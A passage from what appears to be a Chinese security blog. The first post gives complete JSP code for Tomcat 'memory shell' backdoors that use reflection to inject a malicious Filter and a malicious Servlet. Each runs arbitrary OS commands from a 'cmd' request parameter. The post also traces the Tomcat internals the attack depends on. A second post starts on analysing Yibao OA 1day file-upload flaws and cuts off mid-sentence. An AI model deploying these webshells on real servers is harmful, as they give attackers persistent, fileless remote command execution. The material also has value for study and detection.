class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;title&gt;Filter&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    <span class=\"comment\">//获取context</span></span><br><span class=\"line\">    Field reqF = request.getClass().getDeclaredField(<span class=\"string\">&quot;request&quot;</span>);</span><br><span class=\"line\">    reqF.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">    Request req = (Request) reqF.get(request);</span><br><span class=\"line\">    StandardContext stdcontext = (StandardContext) req.getContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//获取上下文的filterConfigs</span></span><br><span class=\"line\">    Field Configs = stdcontext.getClass().getDeclaredField(<span class=\"string\">&quot;filterConfigs&quot;</span>);</span><br><span class=\"line\">    Configs.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">    Map filterConfigs = (Map) Configs.get(stdcontext);  <span class=\"comment\">//获取filterConfigs的所有字段，map类型</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//创建恶意的filter</span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> String name = <span class=\"string\">&quot;Y0ng&quot;</span>;  <span class=\"comment\">//filter的name</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(filterConfigs.get(name)==<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">        Filter filter = <span class=\"keyword\">new</span> Filter() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">init</span><span class=\"params\">(FilterConfig filterConfig)</span> <span class=\"keyword\">throws</span> ServletException </span>&#123; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">doFilter</span><span class=\"params\">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class=\"keyword\">throws</span> IOException, ServletException </span>&#123;</span><br><span class=\"line\">                HttpServletRequest req = (HttpServletRequest) request;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (req.getParameter(<span class=\"string\">&quot;cmd&quot;</span>) != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">boolean</span> isLinux = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">                    String osTyp = System.getProperty(<span class=\"string\">&quot;os.name&quot;</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (osTyp != <span class=\"keyword\">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class=\"string\">&quot;win&quot;</span>)) &#123;</span><br><span class=\"line\">                        isLinux = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    String[] cmds = isLinux ? <span class=\"keyword\">new</span> String[] &#123;<span class=\"string\">&quot;sh&quot;</span>, <span class=\"string\">&quot;-c&quot;</span>, req.getParameter(<span class=\"string\">&quot;cmd&quot;</span>)&#125; : <span class=\"keyword\">new</span> String[] &#123;<span class=\"string\">&quot;cmd.exe&quot;</span>, <span class=\"string\">&quot;/c&quot;</span>, req.getParameter(<span class=\"string\">&quot;cmd&quot;</span>)&#125;;</span><br><span class=\"line\">                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class=\"line\">                    Scanner s = <span class=\"keyword\">new</span> Scanner( in ).useDelimiter(<span class=\"string\">&quot;\\\\a&quot;</span>);</span><br><span class=\"line\">                    String output = s.hasNext() ? s.next() : <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">                    response.getWriter().write(output);</span><br><span class=\"line\">                    response.getWriter().flush();</span><br><span class=\"line\">                    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                chain.doFilter(request, response);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">destroy</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//创建对应的FilterDef</span></span><br><span class=\"line\">        FilterDef filterDef = <span class=\"keyword\">new</span> FilterDef();</span><br><span class=\"line\">        filterDef.setFilter(filter);</span><br><span class=\"line\">        filterDef.setFilterName(name);</span><br><span class=\"line\">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class=\"line\">        <span class=\"comment\">//利用addFilterDef污染filterDefs</span></span><br><span class=\"line\">        stdcontext.addFilterDef(filterDef);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//创建对应的FilterMap</span></span><br><span class=\"line\">        FilterMap filterMap = <span class=\"keyword\">new</span> FilterMap();</span><br><span class=\"line\">        filterMap.addURLPattern(<span class=\"string\">&quot;/Y0ng&quot;</span>);</span><br><span class=\"line\">        filterMap.setFilterName(name);</span><br><span class=\"line\">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class=\"line\">        <span class=\"comment\">//将恶意filter放置第一位</span></span><br><span class=\"line\">        stdcontext.addFilterMapBefore(filterMap);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//调用反射方法，去创建filterConfig实例</span></span><br><span class=\"line\">        Constructor constructor = ApplicationFilterConfig.class.getConstructor(Context.class, FilterDef.class);</span><br><span class=\"line\">        constructor.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(stdcontext, filterDef);</span><br><span class=\"line\">        filterConfigs.put(name,filterConfig);</span><br><span class=\"line\">        out.print(<span class=\"string\">&quot;Inject Success !&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220506213023216.png\" alt=\"image-20220506213023216\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220506213036061.png\" alt=\"image-20220506213036061\"></p>\n<h3 id=\"Servlet\"><a href=\"#Servlet\" class=\"headerlink\" title=\"Servlet\"></a>Servlet</h3><h4 id=\"简单的servlet的实现\"><a href=\"#简单的servlet的实现\" class=\"headerlink\" title=\"简单的servlet的实现\"></a>简单的servlet的实现</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.ServletContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.ServletException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServlet;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.PrintWriter;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestServlet</span> <span class=\"keyword\">extends</span> <span class=\"title\">HttpServlet</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">doGet</span><span class=\"params\">(HttpServletRequest req, HttpServletResponse resp)</span> <span class=\"keyword\">throws</span> ServletException, IOException </span>&#123;</span><br><span class=\"line\">        resp.setContentType(<span class=\"string\">&quot;text/html&quot;</span>);</span><br><span class=\"line\">        PrintWriter out = resp.getWriter();</span><br><span class=\"line\">        out.println(<span class=\"string\">&quot;&lt;h1&gt;Y0ng&lt;/h1&gt;&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>添加web.xml</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;servlet&gt;</span><br><span class=\"line\">    &lt;servlet-name&gt;test&lt;&#x2F;servlet-name&gt;</span><br><span class=\"line\">    &lt;servlet-class&gt;TestServlet&lt;&#x2F;servlet-class&gt;</span><br><span class=\"line\">&lt;&#x2F;servlet&gt;</span><br><span class=\"line\">&lt;servlet-mapping&gt;</span><br><span class=\"line\">    &lt;servlet-name&gt;test&lt;&#x2F;servlet-name&gt;</span><br><span class=\"line\">    &lt;url-pattern&gt;&#x2F;servlet&lt;&#x2F;url-pattern&gt;</span><br><span class=\"line\">&lt;&#x2F;servlet-mapping&gt;</span><br></pre></td></tr></table></figure>\n\n<p>或者</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">@WebServlet(value &#x3D; &#123;&quot;&#x2F;test&quot;&#125;)</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508132415119.png\" alt=\"image-20220508132415119\"></p>\n<h4 id=\"流程分析-2\"><a href=\"#流程分析-2\" class=\"headerlink\" title=\"流程分析\"></a>流程分析</h4><p><a href=\"https://blog.csdn.net/weixin_34100227/article/details/94527430\">tomcat启动加载Servlet源码浅析_weixin_34100227的博客-CSDN博客_servlet加载</a></p>\n<blockquote>\n<p>所以加载engine这个Container，会递归加载子Container。从engine.start() -&gt; host.start() -&gt; context.start()，context的实现类StandardContext中有一个startInternal方法，它触发了一个init的时候设置的监听器ContextConfig，这个监听器将进行Context的相关配置处理</p>\n</blockquote>\n<p>StandardContext#startInternal()，会触发 ContextConfig#lifecycleEvent(LifecycleEvent event)</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508155103205.png\" alt=\"image-20220508155103205\"></p>\n<p>在ContextConfig中触发的方法为 ContextConfig#lifecycleEvent(LifecycleEvent event)，然后委托给方法 ContextConfig#configureStart() 进行处理</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508144010994.png\" alt=\"image-20220508144010994\"></p>\n<p>ContextConfig#configureStart()中有一个核心方法为ContextConfig#webConfig()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508144159729.png\" alt=\"image-20220508144159729\"></p>\n<p>对web.xml进行解析，放入webXml中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508144637218.png\" alt=\"image-20220508144637218\"></p>\n<p>然后调用 ContextConfig#configureContext(webXml)</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508150710884.png\" alt=\"image-20220508150710884\"></p>\n<p>看看其中对servlet的相关操作，先获取所有的servlet，通过StandardContext#createWrapper()创建一个wrapper</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508151011019.png\" alt=\"image-20220508151011019\"></p>\n<p>接下来是对这个wrapper进行包装相关servlet的信息</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508151905197.png\" alt=\"image-20220508151905197\"></p>\n<p>跟进下这个StandardContext#addChild(wrapper)，判断name是不是jsp，然后调用super.addChild，即ContainerBase#addChild()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508152436848.png\" alt=\"image-20220508152436848\"></p>\n<p>发现又调用了ContainerBase#addChildInternal()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508152934288.png\" alt=\"image-20220508152934288\"></p>\n<p>将child装入到hashmap类型的children中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508153311469.png\" alt=\"image-20220508153311469\"></p>\n<p>调用了LifecycleBase#start()启动组件的生命周期：<a href=\"https://www.jianshu.com/p/2a9ffbd00724\">深入理解Tomcat（二）Lifecycle</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508153704979.png\" alt=\"image-20220508153704979\"></p>\n<p>返回到 StandardContext#startInternal()中 loadOnStartup(this.findChildren()) 开始加载servlet</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508160143956.png\" alt=\"image-20220508160143956\"></p>\n<p>ContainerBase#findChildren(),将上面的children(所有的wrapper)放入到容器中，然后返回</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508160329387.png\" alt=\"image-20220508160329387\"></p>\n<p>StandardContext#loadOnStartup()，可以看出遍历所有的wrapper，通过getLoadOnStartup()获得一个数(类似状态码)，如果大于等于0，将其添加到map中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508161242506.png\" alt=\"image-20220508161242506\"></p>\n<p>跟进standardWrapper#getLoadOnStartup()，默认loadOnStartup = -1</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508161919284.png\" alt=\"image-20220508161919284\"></p>\n<p>在servlet的配置当中，**&lt;load-on-startup&gt;1&lt;/load-on-startup&gt;**的含义是：标记容器是否在启动的时候就加载这个servlet<br>当值为0或者大于0时，表示容器在应用启动时就加载这个servlet；<br>当是一个负数时或者没有指定时，则指示容器在该servlet被选择时才加载。</p>\n<p>正数的值越小，启动该servlet的优先级越高</p>\n<p>由于我们要注入内存马，且没有配置xml不会在应用启动时就加载这个servlet，因此需要把优先级调至1，让自己写的servlet直接被加载</p>\n<p>然后就是遍历符合条件的wrapper，通过load()进行加载</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508162614238.png\" alt=\"image-20220508162614238\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508162915068.png\" alt=\"image-20220508162915068\"></p>\n<p>创建了servlet实例</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508163118564.png\" alt=\"image-20220508163118564\"></p>\n<h4 id=\"实现-2\"><a href=\"#实现-2\" class=\"headerlink\" title=\"实现\"></a>实现</h4><p>了解了过程，攻击思路就是：children中存放了很多个child，对应着一个个的wrapper，最后创建了servlet的实例，所以我们需要一个恶意的servlet，并对其进行包装成一个恶意的wrapper，装入到children中，对应的方法就是StandardContext#addChild。</p>\n<figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;&lt;%--</span><br><span class=\"line\">  Created by IntelliJ IDEA.</span><br><span class=\"line\">  User: cys</span><br><span class=\"line\">  Date: <span class=\"number\">2022</span>/<span class=\"number\">5</span>/<span class=\"number\">8</span></span><br><span class=\"line\">  Time: <span class=\"number\">16</span>:<span class=\"number\">59</span></span><br><span class=\"line\">  To change <span class=\"keyword\">this</span> template use File | Settings | File Templates.</span><br><span class=\"line\">--%&gt;</span><br><span class=\"line\">&lt;%@ page contentType=<span class=\"string\">&quot;text/html;charset=UTF-8&quot;</span> language=<span class=\"string\">&quot;java&quot;</span> %&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;%</span><br><span class=\"line\"></span><br><span class=\"line\">  HttpServlet httpServlet = <span class=\"keyword\">new</span> HttpServlet()&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">doGet</span><span class=\"params\">(HttpServletRequest req, HttpServletResponse resp)</span> <span class=\"keyword\">throws</span> ServletException, IOException </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (req.getParameter(<span class=\"string\">&quot;cmd&quot;</span>) != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">boolean</span> isLinux = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        String osTyp = System.getProperty(<span class=\"string\">&quot;os.name&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (osTyp != <span class=\"keyword\">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class=\"string\">&quot;win&quot;</span>)) &#123;</span><br><span class=\"line\">          isLinux = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        String[] cmds = isLinux ? <span class=\"keyword\">new</span> String[] &#123;<span class=\"string\">&quot;sh&quot;</span>, <span class=\"string\">&quot;-c&quot;</span>, req.getParameter(<span class=\"string\">&quot;cmd&quot;</span>)&#125; : <span class=\"keyword\">new</span> String[] &#123;<span class=\"string\">&quot;cmd.exe&quot;</span>, <span class=\"string\">&quot;/c&quot;</span>, req.getParameter(<span class=\"string\">&quot;cmd&quot;</span>)&#125;;</span><br><span class=\"line\">        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class=\"line\">        Scanner s = <span class=\"keyword\">new</span> Scanner( in ).useDelimiter(<span class=\"string\">&quot;\\\\a&quot;</span>);</span><br><span class=\"line\">        String output = s.hasNext() ? s.next() : <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">        resp.getWriter().write(output);</span><br><span class=\"line\">        resp.getWriter().flush();</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"comment\">//获取context</span></span><br><span class=\"line\">  Field reqF = request.getClass().getDeclaredField(<span class=\"string\">&quot;request&quot;</span>);</span><br><span class=\"line\">  reqF.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">  Request req = (Request) reqF.get(request);</span><br><span class=\"line\">  StandardContext stdcontext = (StandardContext) req.getContext();</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">//创建恶意wrapper</span></span><br><span class=\"line\">  Wrapper wrapper = stdcontext.createWrapper();</span><br><span class=\"line\">  String name = <span class=\"string\">&quot;Y0ng&quot;</span>;</span><br><span class=\"line\">  wrapper.setName(name);</span><br><span class=\"line\">  wrapper.setServlet(httpServlet);</span><br><span class=\"line\">  wrapper.setServletClass(httpServlet.getClass().getName());</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">//将Wrapper添加到StandardContext</span></span><br><span class=\"line\">  stdcontext.addChild(wrapper);</span><br><span class=\"line\">  stdcontext.addServletMappingDecoded(<span class=\"string\">&quot;/Y0ng&quot;</span>, name);</span><br><span class=\"line\">  out.print(<span class=\"string\">&quot;Inject Success !&quot;</span>);</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508172806272.png\" alt=\"image-20220508172806272\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508172830181.png\" alt=\"image-20220508172830181\"></p>\n","categories":["JavaSec"]},{"title":"易宝OA","url":"/2024/04/11/%E6%98%93%E5%AE%9DOA/","content":"<h1 id=\"如何快速分析1day漏洞并挖掘0day\"><a href=\"#如何快速分析1day漏洞并挖掘0day\" class=\"headerlink\" title=\"如何快速分析1day漏洞并挖掘0day\"></a>如何快速分析1day漏洞并挖掘0day</h1><p>不需要特别强的代码审计能力，快速根据1day细节追踪并分析代码，在此基础上尝试挖掘其他接口漏洞甚至0day漏洞。</p>\n<a id=\"more\"></a>\n\n<h1 id=\"获取0-1day漏洞\"><a href=\"#获取0-1day漏洞\" class=\"headerlink\" title=\"获取0/1day漏洞\"></a>获取0/1day漏洞</h1><p>可通过公众号等手段获取漏洞信息，以下以易宝OA为例</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240329182351932.png\" alt=\"image-20240329182351932\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240329182407103.png\" alt=\"image-20240329182407103\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">web.title&#x3D;&quot;欢迎登录易宝OA系统 &amp;&amp; &quot;banner&#x3D;&quot;易宝OA&quot;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"细节提取\"><a href=\"#细节提取\" class=\"headerlink\" title=\"细节提取\"></a>细节提取</h2><p>根据放出的图片，提取到 <code>SOAPAction&quot;: &quot;http://tempuri.org/UploadBillFile</code> 、xml数据格式、.net，目录穿越</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240329185227497.png\" alt=\"image-20240329185227497\"></p>\n<h2 id=\"历史漏洞搜索\"><a href=\"#历史漏洞搜索\" class=\"headerlink\" title=\"历史漏洞搜索\"></a>历史漏洞搜索</h2><p>通过文库，github，公众号等搜索相关历史漏洞，例如这里搜索 “易宝OA”，搜到相关漏洞都是文件上传</p>\n<p>第一个：</p>\n<p>提取信息：UploadPersonalFile、/WebService/BasicService.asmx、soap</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327175317594.png\" alt=\"image-20240327175317594\"></p>\n<p>第二个：</p>\n<p>提取信息：/api/files/UploadFile</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327175354245.png\" alt=\"image-20240327175354245\"></p>\n<h1 id=\"源码获取\"><a href=\"#源码获取\" class=\"headerlink\" title=\"源码获取\"></a>源码获取</h1><p>搜索引擎-&gt;历史漏洞-&gt;获取源码，推荐yakit快速筛选出目标</p>\n<p>如何打包？一条命令就搞定</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">rar：</span><br><span class=\"line\">rar.exe a -m3 -r manager.rar manager</span><br><span class=\"line\"></span><br><span class=\"line\">7z：</span><br><span class=\"line\">7z.exe a manager.7z manager &quot;-xr!log&#x2F;&quot;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"环境搭建与分析\"><a href=\"#环境搭建与分析\" class=\"headerlink\" title=\"环境搭建与分析\"></a>环境搭建与分析</h1><p>php-&gt;vscode、java-&gt;IDEA、.net/c#-&gt;dnspy</p>\n<p>快速分析目录结构，全部点一点，分辨出哪些是静态资源，哪些是逻辑源码</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327180512206.png\" alt=\"image-20240327180512206\"></p>\n<p>有问题就问chatgpt</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327180805125.png\" alt=\"image-20240327180805125\"></p>\n<p>这里有几个文件，大概意思就是指定交付给后端的哪块代码处理。</p>\n<p>Global.asax，大概是运行的是TopVision.WebApi这个东西web应用</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;%@ Application Codebehind&#x3D;&quot;Global.asax.cs&quot; Inherits&#x3D;&quot;TopVision.WebApi.WebApiApplication&quot; Language&#x3D;&quot;C#&quot; %&gt;</span><br></pre></td></tr></table></figure>\n\n<p>WebService\\BasicService.asmx，漏洞文件，运行TopVision.WebApi.WebService.BasicService</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;%@ WebService Language&#x3D;&quot;C#&quot; CodeBehind&#x3D;&quot;BasicService.asmx.cs&quot; Class&#x3D;&quot;TopVision.WebApi.WebService.BasicService&quot; %&gt;</span><br></pre></td></tr></table></figure>\n\n<p>WebService\\Gateway.asmx，运行TopVision.WebApi.WebService.Gateway</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;%@ WebService Language&#x3D;&quot;C#&quot; CodeBehind&#x3D;&quot;Gateway.asmx.cs&quot; Class&#x3D;&quot;TopVision.WebApi.WebService.Gateway&quot; %&gt;</span><br></pre></td></tr></table></figure>\n\n<p>.net主要的代码逻辑都在bin目录下的dll，导入到dnspy分析即可。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327181842740.png\" alt=\"image-20240327181842740\"></p>\n<ul>\n<li>core-核心代码</li>\n<li>framework-框架</li>\n<li>tookit-工具相关?</li>\n<li>web-web代码</li>\n<li>webapi-api接口代码</li>\n</ul>\n<p>快速挖洞肯定首选web代码与api接口。</p>\n<h2 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h2><p>翻译翻译就能找到重点，重点就是找，config、setting、service、routes之类的</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327182324302.png\" alt=\"image-20240327182324302\"></p>\n<h2 id=\"API\"><a href=\"#API\" class=\"headerlink\" title=\"API\"></a>API</h2><p>根据代码结构肯定先看ToVision.WebApi了</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327215614715.png\" alt=\"image-20240327215614715\"></p>\n<p>一些filter，session等，主要还是看config和application</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327222032463.png\" alt=\"image-20240327222032463\"></p>\n<h1 id=\"分析历史漏洞\"><a href=\"#分析历史漏洞\" class=\"headerlink\" title=\"分析历史漏洞\"></a>分析历史漏洞</h1><h2 id=\"Web-1\"><a href=\"#Web-1\" class=\"headerlink\" title=\"Web\"></a>Web</h2><p>首先看到settings，漏洞url就出现了，setting-url-service三者结合初步推测代码实现的功能：<code>凡是访问/WebService/BasicService.asmx的都交由Topvision_Web_ERPService_BasicService该服务进行处理</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240327183030758.png\" alt=\"image-20240327183030758\"></p>\n<p>但是与前面分析的矛盾，不是应该交由 